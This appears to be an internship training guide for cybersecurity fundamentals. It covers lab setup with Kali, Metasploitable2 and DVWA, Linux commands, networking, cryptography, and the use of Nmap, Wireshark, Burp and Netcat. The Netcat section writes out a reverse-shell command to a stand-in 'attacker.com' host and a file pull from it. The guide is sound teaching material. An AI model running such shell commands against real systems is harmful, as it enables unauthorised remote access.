# Task 1: Foundation & Environment Setup
## Cybersecurity & Ethical Hacking Internship - ApexPlanet Software

**Timeline:** Days 1-12  
**Objective:** Build strong fundamentals in cybersecurity, networking, cryptography, and set up a professional hacking lab environment.

---

## 📚 Table of Contents

1. [Cybersecurity Fundamentals](#1-cybersecurity-fundamentals)
2. [Lab Environment Setup](#2-lab-environment-setup)
3. [Linux Fundamentals](#3-linux-fundamentals)
4. [Networking Concepts](#4-networking-concepts)
5. [Cryptography Basics](#5-cryptography-basics)
6. [Security Tools](#6-security-tools)
7. [Quick References](#7-quick-references)

---

## 1. Cybersecurity Fundamentals

### The CIA Triad

The CIA Triad is the foundational model for information security, comprising three core principles:

#### **Confidentiality**
- **Definition:** Only authorized individuals can access sensitive information
- **Implementation:** Encryption, access controls, authentication
- **Example:** Database passwords should be hashed and salted, not stored in plaintext
- **Threat:** Unauthorized disclosure of sensitive data (data breaches, espionage)

#### **Integrity**
- **Definition:** Data remains accurate, complete, and unaltered
- **Implementation:** Hashing, digital signatures, checksums
- **Example:** Using SHA-256 hashes to verify file authenticity
- **Threat:** Unauthorized modification of data (tampering, injection attacks)

#### **Availability**
- **Definition:** Authorized users can access resources when needed
- **Implementation:** Redundancy, load balancing, DDoS protection
- **Example:** Using multiple servers to ensure service uptime
- **Threat:** System unavailability (DDoS attacks, hardware failures)

### Common Threat Types

| Threat | Description | Impact | Mitigation |
|--------|-------------|--------|-----------|
| **Phishing** | Social engineering via email | Credential theft, malware installation | User training, email filtering, MFA |
| **Malware** | Malicious software (viruses, trojans, worms) | System compromise, data theft | Antivirus, sandboxing, code analysis |
| **DDoS** | Flooding target with traffic | Service unavailability | Traffic filtering, rate limiting, CDN |
| **SQL Injection** | Inserting SQL commands in input | Database compromise | Prepared statements, input validation |
| **Brute Force** | Attempting multiple password combinations | Unauthorized access | Strong passwords, account lockout, MFA |
| **Ransomware** | Encrypting data and demanding payment | Data loss, operational shutdown | Backups, segmentation, incident response |

### Attack Vectors

- **Social Engineering:** Manipulating people into revealing information (phishing, pretexting, baiting)
- **Wireless Attacks:** Exploiting Wi-Fi vulnerabilities (WEP/WPA cracking, rogue APs, eavesdropping)
- **Insider Threats:** Malicious actions by authorized users with system access
- **Network Attacks:** Exploiting network protocols (Man-in-the-Middle, ARP spoofing, DNS poisoning)
- **Physical Attacks:** Gaining unauthorized physical access to systems (dumpster diving, tailgating)

---

## 2. Lab Environment Setup

### Hardware Requirements

- **Host Machine:** Minimum 8GB RAM, 50GB free disk space
- **Processor:** Multi-core (Intel i5/i7 or AMD equivalent)
- **Network:** Stable internet connection for downloading ISO files

### Virtual Machine Configuration

#### **VirtualBox Setup**
```bash
# Install VirtualBox on Ubuntu/Debian
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# Verify installation
vboxmanage --version
```

#### **Kali Linux - Attacker Machine**
- **ISO:** Download from kali.org
- **RAM Allocation:** 2-4GB
- **Disk:** 20-30GB
- **Network:** Host-Only Adapter (NAT if internet needed)
- **Tools Pre-installed:** Nmap, Wireshark, Burp Suite, Metasploit, aircrack-ng

#### **Metasploitable2 - Vulnerable Target**
- **ISO:** Download from sourceforge.net (Metasploitable2)
- **RAM Allocation:** 1-2GB
- **Disk:** 10GB
- **Network:** Host-Only Adapter (DHCP enabled)
- **Default Credentials:** msfadmin/msfadmin
- **Vulnerabilities:** Intentionally vulnerable for practice (Apache 2.2.4, MySQL 5.0.51, ProFTPD, etc.)

#### **DVWA - Vulnerable Web Application**
- **Setup:**
  ```bash
  # Install DVWA on Apache with PHP and MySQL
  sudo apt install apache2 php php-mysql mysql-server
  
  # Download DVWA
  cd /var/www/html
  git clone https://github.com/digininja/DVWA.git
  
  # Configure database
  cd DVWA
  cp config/config.inc.php.dist config/config.inc.php
  
  # Create database and user
  mysql -u root -p < createDB.sql
  ```
- **Access:** http://localhost/DVWA
- **Default Credentials:** admin/password
- **Vulnerabilities:** SQLi, XSS, CSRF, File Inclusion, Authentication Bypass

### Network Architecture

```
┌─────────────────────────────────────────────┐
│          Host Machine (Main OS)             │
│  ┌──────────────────────────────────────┐   │
│  │  VirtualBox Hypervisor               │   │
│  │  ┌─────────────────────────────────┐ │   │
│  │  │ Host-Only Network (192.168.56.0/24) │   │
│  │  │                                   │ │   │
│  │  │  ┌──────────────┐ ┌──────────────┐│   │
│  │  │  │ Kali Linux   │ │Metasploitable││   │
│  │  │  │ 192.168.56.X │ │ 192.168.56.Y ││   │
│  │  │  └──────────────┘ └──────────────┘│   │
│  │  │       + DVWA                      │   │
│  │  └─────────────────────────────────┘ │   │
│  │  (Isolated from production network)  │   │
│  └──────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

### Security Considerations

1. **Complete Isolation:** Host-Only adapter ensures no external network access
2. **Snapshot Management:** Create snapshots before major changes
3. **No Public Exposure:** Never expose vulnerable VMs to internet
4. **Logging:** Enable audit logging for all security activities
5. **Documentation:** Record all changes and attack scenarios

---

## 3. Linux Fundamentals

### File System Navigation

```bash
# Print current working directory
pwd

# List directory contents
ls -la                    # Detailed listing with hidden files
ls -lh                    # Human-readable sizes
ls -R                     # Recursive listing

# Change directory
cd /path/to/directory     # Absolute path
cd ~                      # Home directory
cd ..                     # Parent directory
cd -                      # Previous directory

# Directory navigation tips
pushd /path               # Save current dir and change
popd                      # Return to saved dir
```

### File & Directory Permissions

```bash
# Understanding permissions: rwxrwxrwx
# 1st triplet: Owner permissions
# 2nd triplet: Group permissions
# 3rd triplet: Other permissions
# r=4, w=2, x=1

# Change file permissions
chmod 644 file.txt        # rw-r--r--  (644 = 4+2, 4, 4)
chmod 755 script.sh       # rwxr-xr-x  (755 = 4+2+1, 4+1, 4+1)
chmod u+x file            # Add execute for owner
chmod g-w file            # Remove write for group
chmod o=r file            # Set other to read-only

# Recursive permission change
chmod -R 755 directory/

# Change owner and group
chown user file           # Change owner
chown user:group file     # Change owner and group
chown -R user:group dir/  # Recursive change

# Common permission scenarios
644  rw-r--r--  (files)    - Owner can read/write, others can read
755  rwxr-xr-x  (scripts)  - Owner can execute, others can read/execute
700  rwx------  (private)  - Only owner can access
777  rwxrwxrwx  (shared)   - Everyone has full access (not recommended)
```

### Package Management

```bash
# APT (Advanced Packaging Tool) - Debian/Ubuntu

# Update package lists
sudo apt update

# Upgrade installed packages
sudo apt upgrade          # Upgrade all packages
sudo apt dist-upgrade     # Upgrade with dependency changes

# Install packages
sudo apt install package-name
sudo apt install pkg1 pkg2 pkg3  # Install multiple

# Remove packages
sudo apt remove package-name      # Remove but keep config
sudo apt purge package-name       # Remove everything
sudo apt autoremove              # Remove unused dependencies

# Search packages
apt search keyword
apt search nmap

# Show package information
apt show package-name
apt policy package-name

# DPKG (Debian Package) - Low-level package management

# Install from .deb file
sudo dpkg -i package.deb

# List installed packages
dpkg -l
dpkg -l | grep nmap

# Remove package
sudo dpkg -r package-name

# View package contents
dpkg -L package-name
```

### Working with Files

```bash
# View file contents
cat filename              # Display entire file
less filename             # Paginated viewing (q to quit)
head -n 20 filename       # First 20 lines
tail -n 20 filename       # Last 20 lines
tail -f filename          # Follow file (useful for logs)

# Find text in files
grep "pattern" file       # Search for pattern
grep -i "pattern" file    # Case-insensitive search
grep -r "pattern" dir/    # Recursive search
grep -n "pattern" file    # Show line numbers
grep -v "pattern" file    # Invert match (exclude)

# File operations
touch newfile             # Create empty file
mkdir directory           # Create directory
mkdir -p /path/to/dir     # Create with parents
cp source destination     # Copy file
cp -r source/ dest/       # Copy directory recursively
mv source destination     # Move/rename
rm file                   # Delete file
rm -rf directory/         # Delete directory recursively (CAREFUL!)

# File information
file filename             # Determine file type
wc -l filename            # Count lines
wc -w filename            # Count words
du -sh directory/         # Directory size
df -h                     # Disk space usage

# Text processing
sort filename             # Sort lines
uniq filename             # Remove duplicates
cut -d: -f1 /etc/passwd   # Extract fields
sed 's/old/new/g' file    # Stream editor (find/replace)
awk '{print $1}' file     # Pattern scanning and processing
```

### User and Permissions Management

```bash
# User management
whoami                    # Current user
id                        # User ID and group ID
sudo command              # Execute as superuser
sudo -i                   # Switch to root shell
sudo -u user command      # Execute as specific user

# Switch user
su - username             # Switch user with environment
su username               # Switch without loading environment

# File ownership
sudo chown user file      # Change file owner
sudo chown user:group file # Change owner and group

# File permissions
sudo chmod 644 file       # Regular file permissions
sudo chmod 755 script     # Executable script permissions

# View users
cat /etc/passwd           # User database
cut -d: -f1 /etc/passwd   # List all usernames

# Password management
passwd                    # Change current user password
sudo passwd user          # Change other user's password
sudo passwd -l user       # Lock user account
sudo passwd -u user       # Unlock user account
```

### System and Process Information

```bash
# System information
uname -a                  # Complete system information
lsb_release -a            # Linux distribution info
hostname                  # System hostname
uptime                    # System uptime

# Process management
ps aux                    # List all processes
ps aux | grep process     # Find specific process
top                       # Real-time process viewer
htop                      # Enhanced process viewer (install: apt install htop)
kill PID                  # Terminate process
kill -9 PID               # Force kill process
killall processname       # Kill all instances

# Process priority
nice -n 10 command        # Run with lower priority
renice -n 5 -p PID        # Adjust running process priority
```

### Essential Networking Commands

```bash
# Network interface configuration
ip addr show              # Display all IP addresses
ip addr show eth0         # Specific interface
ifconfig                  # Legacy command (deprecated)
ifconfig -a               # All interfaces with ifconfig

# Configure network manually
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip route add default via 192.168.1.1
sudo ip link set eth0 up  # Enable interface

# Test connectivity
ping -c 4 8.8.8.8         # Ping with count
ping 8.8.8.8              # Continuous ping (Ctrl+C to stop)
ping -f 8.8.8.8           # Flood ping (requires root)

# DNS queries
nslookup google.com       # Query DNS server
dig google.com            # Detailed DNS information
dig google.com +short     # Short output
host google.com           # Simple DNS lookup

# Route information
route -n                  # Display routing table
ip route show             # Display routes (modern)
traceroute 8.8.8.8        # Trace path to host
tracepath 8.8.8.8         # Similar to traceroute

# Network statistics
netstat -tuln             # Listening ports (legacy)
ss -tuln                  # Socket statistics (modern)
netstat -an               # All connections
netstat -ap | grep 'tcp'  # TCP connections
ss -tp | grep 'LISTEN'    # Listening ports

# Network configuration files (Debian/Ubuntu)
cat /etc/network/interfaces           # Network config
cat /etc/resolv.conf                  # DNS configuration
cat /etc/hostname                     # System hostname
```

### File Permissions Quick Reference

```
Permission Binary Octal
---------- 000   0
--x------ 001   1
-w------- 010   2
-wx------ 011   3
r-------- 100   4
r-x------ 101   5
rw------- 110   6
rwx------ 111   7

chmod syntax: chmod [who][+/-][permissions] file
who: u(user), g(group), o(other), a(all)
permissions: r(read), w(write), x(execute)

Examples:
chmod u+x file    - Add execute for user
chmod g-w file    - Remove write for group
chmod o=r file    - Set other to read only
chmod 644 file    - rw-r--r--
chmod 755 file    - rwxr-xr-x
chmod 600 file    - rw-------
```

---

## 4. Networking Concepts

### OSI Model (7 Layers)

| Layer | Name | Protocol Examples | Devices |
|-------|------|-------------------|---------|
| 7 | Application | HTTP, HTTPS, FTP, SSH, SMTP, DNS | Applications |
| 6 | Presentation | SSL/TLS, JPEG, ASCII | Encryption engines |
| 5 | Session | NFS, RPC | Session managers |
| 4 | Transport | TCP, UDP, SCTP | Firewalls, proxies |
| 3 | Network | IP (IPv4/IPv6), ICMP, IGMP | Routers |
| 2 | Data Link | Ethernet, PPP, MAC | Switches |
| 1 | Physical | Cables, Signals, Hubs | Repeaters, hubs |

### TCP/IP Protocol Suite

**IP (Internet Protocol)**
```
Header Structure:
- Version: IPv4 or IPv6
- Header Length: 20-60 bytes
- Type of Service (ToS): QoS parameters
- Total Length: Max 65,535 bytes
- Identification, Flags, Fragment Offset: Fragmentation
- TTL (Time to Live): Hop count limit (default 64)
- Protocol: TCP (6), UDP (17), ICMP (1), etc.
- Source & Destination IP Address: 32-bit addresses
- Options: Optional additional parameters
```

**TCP (Transmission Control Protocol)**
```
Characteristics:
- Connection-oriented: Must establish connection first
- Reliable: Guarantees data delivery
- Ordered: Data arrives in sequence
- Flow Control: Prevents overwhelming receiver
- Error Checking: Detects corrupted data

Three-way handshake:
1. SYN: Client sends synchronization request
2. SYN-ACK: Server acknowledges and responds
3. ACK: Client confirms connection

Common ports:
- 80: HTTP
- 443: HTTPS
- 22: SSH
- 21: FTP
- 25: SMTP
- 53: DNS
- 3306: MySQL
- 5432: PostgreSQL
```

**UDP (User Datagram Protocol)**
```
Characteristics:
- Connectionless: No connection establishment
- Unreliable: No delivery guarantee
- Fast: Minimal overhead
- No flow control: Send and hope

Common ports:
- 53: DNS
- 69: TFTP
- 123: NTP
- 161: SNMP
- 5353: mDNS
- 5004-5005: RTP
```

### IPv4 Addressing

```
Format: XXX.XXX.XXX.XXX (4 octets, each 0-255)

Classes (Deprecated - use CIDR):
Class A: 1-127           Private: 10.0.0.0/8
Class B: 128-191         Private: 172.16.0.0/12
Class C: 192-223         Private: 192.168.0.0/16

CIDR Notation (Classless Inter-Domain Routing):
192.168.1.0/24          = 256 addresses (254 usable)
192.168.1.0/25          = 128 addresses (126 usable)
192.168.1.0/30          = 4 addresses (2 usable)
10.0.0.0/8              = 16,777,216 addresses
172.16.0.0/12           = 1,048,576 addresses

Subnet calculation:
Network Address:        192.168.1.0
Broadcast Address:      192.168.1.255
Usable Hosts:           192.168.1.1 - 192.168.1.254
Default Gateway:        Usually 192.168.1.1

Special addresses:
127.0.0.1               Loopback (localhost)
0.0.0.0                 All interfaces
255.255.255.255         Broadcast
8.8.8.8                 Google DNS
1.1.1.1                 Cloudflare DNS
```

### DNS (Domain Name System)

```
Purpose: Translate domain names to IP addresses

Record Types:
A               IPv4 address
AAAA            IPv6 address
CNAME           Canonical name (alias)
MX              Mail exchange
NS              Name server
TXT             Text records (SPF, DKIM)
SOA             Start of authority
PTR             Pointer (reverse DNS)

DNS Query example:
$ dig google.com

google.com.     3599    IN  A   142.250.185.46

DNS Servers:
Google:         8.8.8.8, 8.8.4.4
Cloudflare:     1.1.1.1, 1.0.0.1
OpenDNS:        208.67.222.222, 208.67.220.220

Security considerations:
- DNS poisoning: Corrupting DNS cache
- DNS spoofing: Faking DNS responses
- DNS tunneling: Exfiltrating data via DNS
```

---

## 5. Cryptography Basics

### Encryption Algorithms

#### **Symmetric Encryption (Same key for encryption/decryption)**

```
AES (Advanced Encryption Standard)
- Key sizes: 128, 192, 256 bits
- Block size: 128 bits
- Current standard, highly secure
- Used in: TLS, VPNs, disk encryption

DES (Data Encryption Standard) - DEPRECATED
- Key size: 56 bits
- Block size: 64 bits
- Vulnerable to brute-force attacks
- Replaced by 3DES and AES

3DES (Triple DES)
- Key size: 168 bits (3x56 bits)
- Block size: 64 bits
- Better than DES but slower than AES
- Being phased out
```

#### **Asymmetric Encryption (Public & Private keys)**

```
RSA (Rivest-Shamir-Adleman)
- Key sizes: 1024, 2048, 4096 bits
- Based on factorization difficulty
- Slower than symmetric
- Used for key exchange, digital signatures
- 1024-bit considered weak, use 2048+ for security

ECC (Elliptic Curve Cryptography)
- Key sizes: 256, 384, 521 bits
- Faster than RSA
- Smaller key sizes for equivalent security
- Used in modern TLS, Bitcoin

Diffie-Hellman
- Key agreement protocol
- Allows secure key exchange over insecure channel
- Forms basis for Perfect Forward Secrecy
```

### Hashing Algorithms

```
Purpose: Create fixed-size fingerprint from any input
- One-way: Cannot reverse the hash
- Deterministic: Same input always produces same hash
- Avalanche effect: Small input change creates completely different hash
- No collisions (theoretically): Different inputs shouldn't hash to same value

Common algorithms:
MD5 (DEPRECATED)
- Output: 128 bits (32 hex characters)
- Vulnerable to collision attacks
- Still used but not recommended for security

SHA-1 (Deprecated)
- Output: 160 bits (40 hex characters)
- Vulnerable to collision attacks
- Being phased out for security applications

SHA-2 Family (Industry Standard)
- SHA-256: 256 bits (64 hex characters)
- SHA-512: 512 bits (128 hex characters)
- Secure for most applications
- Recommended replacement for MD5 and SHA-1

SHA-3 (Keccak)
- Output: Various sizes (224, 256, 384, 512 bits)
- Newest standard, very secure
- Not yet widely deployed

Bcrypt / Scrypt / Argon2
- Password hashing algorithms
- Include salt and computationally expensive
- Designed specifically for password security
- Resistant to GPU/ASIC attacks

Hashing examples:
echo -n "password" | md5sum
echo -n "password" | sha256sum
openssl dgst -sha256 file.txt
```

### Digital Certificates & SSL/TLS

```
X.509 Certificate Structure:
- Version: Certificate version (v3 typical)
- Serial Number: Unique identifier
- Signature Algorithm: Algorithm used (sha256WithRSAEncryption)
- Issuer: CA that signed the certificate
- Validity: Not Before and Not After dates
- Subject: Entity the certificate belongs to
- Public Key: Subject's public key
- Extensions: Additional information (Key Usage, SANs, etc.)

Certificate Chain:
Root CA → Intermediate CA → End-Entity Certificate

Trust Model:
1. Browser has Root CA certificates pre-installed
2. Web server presents End-Entity certificate
3. Browser verifies End-Entity is signed by Intermediate
4. Browser verifies Intermediate is signed by Root CA
5. If chain verifies, connection is trusted

TLS/SSL Handshake:
1. ClientHello: Client requests secure connection
2. ServerHello: Server responds with certificate
3. Key Exchange: Agree on session keys
4. Finished: Both parties confirm handshake

TLS Versions:
SSL 3.0           DEPRECATED
TLS 1.0           DEPRECATED
TLS 1.1           DEPRECATED
TLS 1.2           CURRENT STANDARD
TLS 1.3           MODERN, FASTER

Certificate verification:
openssl x509 -in cert.pem -text -noout
openssl verify -CAfile ca.pem cert.pem
```

---

## 6. Security Tools

### Wireshark

```bash
# Installation
sudo apt install wireshark
sudo usermod -aG wireshark $USER    # Add user to wireshark group

# Basic commands
wireshark                           # Launch GUI
tshark                             # Command-line version
tcpdump -i eth0 -n                 # Simple packet capture

# Capture filters (before capture)
tcp.port == 80                     # HTTP traffic
tcp.port == 443                    # HTTPS traffic
ip.src == 192.168.1.100           # From specific IP
ip.dst == 8.8.8.8                 # To specific IP
tcp.flags.syn==1 && tcp.flags.ack==0  # SYN packets
tcp.flags.reset==1                 # RST packets

# Display filters (after capture)
http                              # HTTP traffic only
dns                               # DNS traffic only
ssh                               # SSH traffic only
icmp                              # ICMP ping traffic
tcp.port == 22                    # SSH port 22
udp.port == 53                    # DNS port 53
ip.src == 192.168.1.1 && ip.dst == 8.8.8.8  # Specific conversation

# Color coding
- Blue: TCP
- Green: UDP
- Red: Errors
- Black: TCP SYN/FIN packets
- Light colors: Retransmissions
```

### Nmap

```bash
# Installation
sudo apt install nmap

# Basic scans
nmap 192.168.1.1                   # Basic scan
nmap 192.168.1.1-100               # Scan range
nmap 192.168.1.0/24                # Scan subnet

# Scan types
-sS                               # TCP SYN stealth scan (default, requires root)
-sT                               # TCP connect scan (default for non-root)
-sU                               # UDP scan
-sA                               # TCP ACK scan (firewall mapping)
-sP                               # Ping scan (hosts only)
-p 80,443,22                      # Specific ports
-p 1-1000                         # Port range
-p-                               # All 65535 ports

# Service detection
-sV                               # Detect service versions
-O                                # Detect operating system
-A                                # Aggressive scan (OS, version, script, traceroute)

# Output options
-oN file.txt                      # Normal output to file
-oX file.xml                      # XML output
-oG file.gnmap                    # Greppable output
-v                                # Verbose
-vv                               # Very verbose

# Timing templates
-T0 to -T5                        # Paranoid to Insane
-T4                               # Aggressive (good balance)

# Examples
nmap -sV -sC -O 192.168.1.1       # Full scan with versions and scripts
nmap -sV -p- 192.168.1.1          # All ports with version detection
nmap -Pn 192.168.1.1              # Skip ping (assume host up)
nmap --script vuln 192.168.1.1    # Run vulnerability scripts
```

### Burp Suite

```bash
# Installation
sudo apt install burpsuite-community

# Proxy setup
1. Launch Burp Suite
2. Go to Proxy → Options
3. Ensure Proxy Listener on 127.0.0.1:8080
4. Configure browser to use proxy:
   - HTTP Proxy: 127.0.0.1
   - Port: 8080
   - HTTPS Proxy: Same as HTTP

# Basic workflow
1. Capture traffic in Proxy tab
2. Review requests/responses
3. Forward to Target site map
4. Use Intruder for parameter testing
5. Use Scanner for automated vulnerability detection

# Common features
- Intercept: Pause requests for modification
- Intruder: Automated parameter fuzzing and brute-force
- Repeater: Resend requests with modifications
- Scanner: Automated vulnerability scanning
- Target: Site structure mapping
- Spider: Crawl application automatically

# Key tests
- SQL Injection: Test database inputs
- XSS: Test reflected and stored attacks
- CSRF: Verify token validation
- Authentication: Test bypass mechanisms
- Business logic: Test application features
```

### Netcat

```bash
# Installation
sudo apt install netcat-openbsd

# Netcat basics
nc -l -p 1234                     # Listen on port 1234
nc target.com 1234                # Connect to target
echo "hello" | nc target.com 1234 # Send data and close

# Port scanning (slow, not recommended)
nc -zv 192.168.1.1 1-1000        # Scan ports 1-1000
nc -zv -w1 192.168.1.1 80        # Scan with 1 second timeout

# Banner grabbing
nc 192.168.1.1 80                 # Connect and read banner
(echo -e "GET / HTTP/1.0\r\nHost: target\r\n\r\n"; sleep 1) | nc target.com 80

# Reverse shell (on attacker)
nc -l -p 4444                     # Listen for connection

# Reverse shell (on victim)
nc attacker.com 4444 -e /bin/sh   # Connect and execute shell

# File transfer (send)
cat file.txt | nc -l -p 5555      # Send file

# File transfer (receive)
nc attacker.com 5555 > received.txt  # Receive file
```

---

## 7. Quick References

### Common Ports

```
20-21:   FTP
22:      SSH
23:      Telnet
25:      SMTP
53:      DNS
80:      HTTP
110:     POP3
143:     IMAP
443:     HTTPS
445:     SMB (Windows sharing)
3306:    MySQL
3389:    RDP (Remote Desktop)
5432:    PostgreSQL
5900:    VNC
8080:    HTTP Alternate
8443:    HTTPS Alternate
```

### Linux Directory Structure

```
/           Root directory
/bin        Essential binaries (ls, cat, grep)
/sbin       System binaries (root access needed)
/etc        Configuration files
/home       User home directories
/root       Root user's home directory
/tmp        Temporary files (cleared on reboot)
/var        Variable data (logs, databases)
/var/log    System logs
/var/www    Web server files
/usr        User programs and libraries
/opt        Optional software
/dev        Device files
/proc       Process information
/sys        System information
```

### Important Security Files

```
/etc/passwd          User account information
/etc/shadow          User password hashes (root only)
/etc/group           Group definitions
/etc/sudoers         Sudo privileges
/etc/ssh/sshd_config SSH server configuration
/var/log/auth.log    Authentication logs
/var/log/syslog      System logs
/etc/hosts           Hostname to IP mappings
/etc/resolv.conf     DNS configuration
```

### IP Ranges to Remember

```
10.0.0.0        10.255.255.255       (10/8 prefix)
172.16.0.0      172.31.255.255       (172.16/12 prefix)
192.168.0.0     192.168.255.255      (192.168/16 prefix)
127.0.0.1       Loopback address
0.0.0.0         All addresses
255.255.255.255 Broadcast address
```

---

## Resources & Further Learning

### Online Resources
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- DigitalOcean Linux Tutorials: https://www.digitalocean.com/community/tutorials
- Linux Handbook: https://linuxhandbook.com/
- Cisco Networking Basics: https://www.cisco.com/

### Tools Documentation
- Wireshark Wiki: https://wiki.wireshark.org/
- Nmap Official Guide: https://nmap.org/docs.html
- Burp Suite Help: https://portswigger.net/burp/documentation
- Kali Linux Tools: https://tools.kali.org/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- OverTheWire Wargames: https://overthewire.org/

---

## Contact & Support

**ApexPlanet Software Pvt. Ltd.**
- Website: www.apexplanet.in
- Email: info@apexplanet.in
- Phone: +91 9905879870

---

**Last Updated:** March 2025  
**Task:** 1 - Foundation & Environment Setup  
**Status:** Complete ✅
